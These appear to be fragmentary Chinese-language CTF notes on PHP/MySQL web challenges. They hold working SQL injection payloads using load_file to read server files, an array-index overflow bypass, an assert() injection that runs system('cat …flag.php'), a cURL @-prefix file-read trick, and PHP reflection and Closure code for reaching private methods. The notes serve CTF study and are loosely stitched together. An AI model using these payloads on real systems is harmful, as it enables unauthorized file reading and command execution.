通过搜索可得MySQL有个叫load_file的方法，可以读取一个文件的内容并将其作为字符串返回。这个方法当然比常规的方法简单很多，就是有条件限制：
- ### 条件
  > 必须有权限读取并且文件必须完全可读。
  > 读取文件必须在服务器上
  > 必须指定文件完整的路径
  > 读取文件必须小于max_allowed_packet
  后三条应该满足，flag没多大且肯定在服务器上，我们也有了当前网站绝对路径所以可以猜一下flag的路径。第一条可以用一条语句确定当前用户用没有读取权限
  1+and+(select+count(*)+from+mysql.user)>0--+
  2+union/**/select+1,user(),3,4--+
  返回结果是root@localhost，那就是有权限了。
  2+union/**/select+1,load_file("/var/www/html/flag.php"),3,4--+
  
  
  
  $array = ['admin', 'user'];
  if($stuff === $array && $stuff[0] != 'admin')
  解
  意思就是说数组的0索引所对应的元素完全相等于数组0x100000000所对应的元素。影响范围可以在[这里](https://3v4l.org/Sjdf8)找到，发现5.5.9包括在内。
0x100000000的十进制形式就是4294967296。这时我们就可以构造绕过第一个if的payload了。
  stuff[4294967296]=admin&stuff[1]=user
 
 
 `file_exists()` 返回布尔值：
* 如果文件存在，则返回 `TRUE`
* 如果文件不存在，则返回 `FALSE` 
  与其他相关函数不同的是：
* `is_file($filename)` 仅检查文件是否存在，并且必须是一个文件，而不是目录。
* `is_dir($filename)` 检查是否存在一个目录，哪怕它是空的。
  
  - ### strpos
- > 查找字符串在另一字符串中第一次出现的位置（区分大小写）,如果没有找到字符串则返回 FALSE。
templates/'.system('cat+./templates/flag.php').'.php
assert("strpos('$file', '..') === false") or die("Detected hacking attempt!");
assert("strpos('templates/'.system('cat+./templates/flag.php').'.php', '..') === false") or die("Detected hacking attempt!");





- ### CURLOPT_POSTFIELDS
- > 全部数据使用HTTP协议中的 "POST" 操作来发送。 要发送文件，在文件名前面加上@前缀并使用完整路径。 文件类型可在文件名后以 ';type=mimetype' 的格式指定。 这个参数可以是 urlencoded 后的字符串，类似'para1=val1&para2=val2&...'，也可以使用一个以字段名为键值，字段数据为值的数组。 如果value是一个数组，Content-Type头将会被设置成multipart/form-data。 从 PHP 5.2.0 开始，使用 @ 前缀传递文件时，value 必须是个数组。 从 PHP 5.5.0 开始, @ 前缀已被废弃，文件可通过 CURLFile 发送。 设置 CURLOPT_SAFE_UPLOAD 为 true 可禁用 @ 前缀发送文件，以增加安全性。
- ### CURLOPT_SAFE_UPLOAD
- > 默认true。禁用 @ 前缀在 CURLOPT_POSTFIELDS 中发送文件。 意味着 @ 可以在字段中安全地使用了。 可使用 CURLFile 作为上传的代替。
- > PHP 5.5.0 中添加，默认值 false。 PHP 5.6.0 改默认值为 true。PHP 7 删除了此选项， 必须使用 CURLFile interface 来上传文件
@符号出现了。这里的意思就是如果CURLOPT_SAFE_UPLOAD为False，那么在CURLOPT_POSTFIELDS要发送的文件名前面加上@就可以使用完整路径读取文件了。此时问题又来到了经典的文件任意读取。问题是，读取啥文件呢？我们现在完全不知道flag文件在哪。
上传还读取




python美化
https://codebeautify.org/python-formatter-beautifier



<?php
function sha1(){
	return 'success';
}
echo sha1();
?>
这样直接重写一个sha1函数会报错
**Fatal error: Cannot redeclare sha1() in C:\Users\j7ur8\Desktop\php\index.php on line 5**
可以试试增加一个namespace，代码如下
<?php
namespace interesting;
function sha1(){
	return 'success';
}
echo sha1();
我们可以把平常我们编写代码时调用函数想象成是发生在一个主命名空间下的，也就是我们在主命名空间下编写代码。php支持使用namespace来解释重复出现的变量和方法，所以我们可以使用namespace来重写namespace下的sha1函数。可参考：[namespace](

利用反射Reflecttion（(PHP 5, PHP 7)）
	调用**私有方法**
		<?php  
		class Example1{ 
			private $_prop = 'test'; 
		} 
		 
		$r = function(Example1 $e){ 
			return $e->_prop; 
		}; 
		 
		$a = new Example1(); 
		$rfp = new ReflectionProperty('Example1','_prop'); 
		$rfp->setAccessible(true); 
		var_dump($rfp->getValue($a)); 
		 
		//结果输出：string 'test' (length=4) 
		?> 
	带参数的	
			public function callPrivateMethod($object, $methodName)
		{
			$reflectionClass = new \ReflectionClass($object);
			$reflectionMethod = $reflectionClass->getMethod($methodName);
			$reflectionMethod->setAccessible(true);

			$params = array_slice(func_get_args(), 2); //get all the parameters after $methodName
			return $reflectionMethod->invokeArgs($object, $params);
		}
	私有属性	
		<?php
		class Foo {
		  private function myPrivateMethod() {
			return 7;
		  }
		}

		$method = new ReflectionMethod('Foo', 'myPrivateMethod');
		$method->setAccessible(true);

		echo $method->invoke(new Foo);
		// echos "7"
		?>
	反射一个类也可以通过反射命名空间来搞
	国赛中的payload为：
		<?php
		$ref_class=new ReflectionClass(\'interesting\FlagSDK');
		$instance=$ref_class->newInstance();
		$method=$ref_class->getmethod('getHash');
		$method->setAccessible(true);
		echo $method->invoke($instance);
		?>	无论是反射方法还是属性都有一步时setAccessible
		
利用Closure类（PHP 5 >= 5.3.0, PHP 7）
	访问属性	
		<?php  
		class Example1{ 
			private $_prop = 'test'; 
		} 
		$r = function(Example1 $e){ 
			return $e->_prop; 
		}; 		 
		$a = new Example1(); 
		$r = Closure::bind($r,null,$a); 		 
		var_dump($r($a)); 		 
		//结果输出：string 'test' (length=4) 	
	通过closure类进行可更改的调用
		<?php  
		class Example1{ 
			private $_prop = 'test'; 
		} 
		 
		$a = new Example1(); 
		$r = Closure::bind(function & (Example1 $e) { 
			return $e->_prop; 
		}, null, $a); 
		 
		$cake = & $r($a); 
		$cake = 'lie'; 
		var_dump($r($a)); 
	利用Closure类访问方法 php7
		<?php
		class Foo {
			private $bar = "Foo::Bar";
			private function add_ab($a, $b) {
				return $a + $b;
			}
		}
		$foo = new Foo;
		$getFooBar = function() {
			return $this->bar;
		};
		echo $getFooBar->call($foo); 

		$getFooAddAB = function() {
			return $this->add_ab(func_get_args()[0],func_get_args()[1]);
		};//func_get_arg(0)
		var_dump($getFooAddAB->call($foo, 33, 6)); // Prints 39	
	php5 php7	
			<?php
		class Foo {
			private $bar = "Foo::Bar";
			private function add_ab($a, $b) {
				return $a + $b;
			}
		}
		$foo = new Foo;
		$getFooBarCallback = function() {
			return $this->bar;
		};
		$getFooBar = $getFooBarCallback->bindTo($foo, 'Foo');
		echo $getFooBar(); // Prints Foo::Bar


		$getFooAddABCallback = function() {
			return call_user_func_array(array($this, 'add_ab'), func_get_args());
		};
		$getFooAddAB = $getFooAddABCallback->bindTo($foo, 'Foo');
		echo $getFooAddAB(33, 6); 